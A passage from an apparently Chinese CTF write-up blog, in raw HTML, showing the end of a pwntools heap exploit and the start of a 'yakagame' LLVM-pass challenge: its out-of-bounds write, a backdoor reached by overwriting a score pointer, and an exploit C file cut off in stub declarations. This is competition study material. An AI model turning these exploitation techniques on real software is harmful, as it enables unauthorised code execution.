class="hljs-comment"># add(11,0x468)</span><br>cat()<br>menu(<span class="hljs-string">&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">11</span>))<br>sla(<span class="hljs-string">&#x27;plz input your cat size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x468</span>))<br><br>sleep(<span class="hljs-number">2</span>)<br>sl(orw)<br><br><span class="hljs-comment"># dele(9)</span><br><span class="hljs-comment"># dele(4)</span><br><span class="hljs-comment"># dele(5)</span><br><span class="hljs-comment"># dele(4)</span><br><span class="hljs-comment"># add(10,0x458)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *0x7ffff7e011c8</span><br><span class="hljs-string">   0x7ffff7e011b4 &lt;__vfprintf_internal+260&gt;    cmp    rdi, rax</span><br><span class="hljs-string">   0x7ffff7e011b7 &lt;__vfprintf_internal+263&gt;    jbe    __vfprintf_internal+6560                &lt;__vfprintf_internal+6560&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">   0x7ffff7e011bd &lt;__vfprintf_internal+269&gt;    mov    rsi, qword ptr [rsp + 8]</span><br><span class="hljs-string">   0x7ffff7e011c2 &lt;__vfprintf_internal+274&gt;    mov    rdx, rbx</span><br><span class="hljs-string">   0x7ffff7e011c5 &lt;__vfprintf_internal+277&gt;    mov    rdi, rbp</span><br><span class="hljs-string"> ► 0x7ffff7e011c8 &lt;__vfprintf_internal+280&gt;    call   qword ptr [r12 + 0x38]        &lt;0&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">   0x7ffff7e011cd &lt;__vfprintf_internal+285&gt;    cmp    rbx, rax</span><br><span class="hljs-string">   0x7ffff7e011d0 &lt;__vfprintf_internal+288&gt;    jne    __vfprintf_internal+5880                &lt;__vfprintf_internal+5880&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="yakagame"><a class="header-anchor" href="#yakagame">¶</a>yakagame</h3><p>Exp 有概率失败，但成功率很高。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731085710766.png" alt="exp"></p><h4 id="分析-v2"><a class="header-anchor" href="#分析-v2">¶</a>分析</h4><p>经典的 llvm pass pwn 题，蛋疼的是给出来的几个函数都没用，在上面浪费了太多的时间了。</p><p>关键函数:</p><p>1.后门函数，要求score&gt;0x12345678</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731090206313.png" alt="yakagame1"></p><p>进入后会执行 cmd 指针内存放的内容。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731090304553.png" alt="yakagame2"></p><p>2.下标越界</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731090050060.png" alt="yakagame3"></p><p>其中，<strong>v33 为 char 类型</strong> ，在函数数量足够多时可以遍历到<strong>负数</strong>下标，构成越界写。</p><p>思路：</p><ol><li>首先需要能够进入后门函数，我们需要在可控范围内找到一个内容 &gt; 0x12345678 的地址，这里我选的是 <code>stdout@got + 2</code> ，0x7f 开头的 8 个字节可以保证进入后门函数，利用越界写控制下标覆写 score 指针。</li><li>其次需要控制 cmd 的内容，理想状态应该选取 <code>/bin/sh\0</code> ，但我没能在固定地址找到，就选取了 <code>sh\0</code>，最终也成功完成了利用。</li></ol><h4 id="exp-c"><a class="header-anchor" href="#exp-c">¶</a>exp.c</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">fight</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> num)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n0</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n1</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n2</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n3</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n4</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n5</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n6</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n7</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n8</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n9</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n10</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n11</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n12</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n13</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n14</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n15</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n16</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n17</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n18</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n19</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n20</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n21</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n22</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n23</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n24</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n25</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n26</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n27</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n28</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n29</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n30</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n31</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n32</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n33</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n34</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n35</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n36</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n37</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n38</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n39</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n40</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n41</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n42</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n43</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n44</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n45</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n46</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n47</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n48</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n49</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n50</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n51</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n52</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n53</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n54</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n55</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n56</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n57</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n58</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n59</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n60</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n61</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n62</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n63</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n64</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n65</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n66</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n67</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n68</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n69</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n70</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n71</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n72</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n73</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n74</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n75</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title 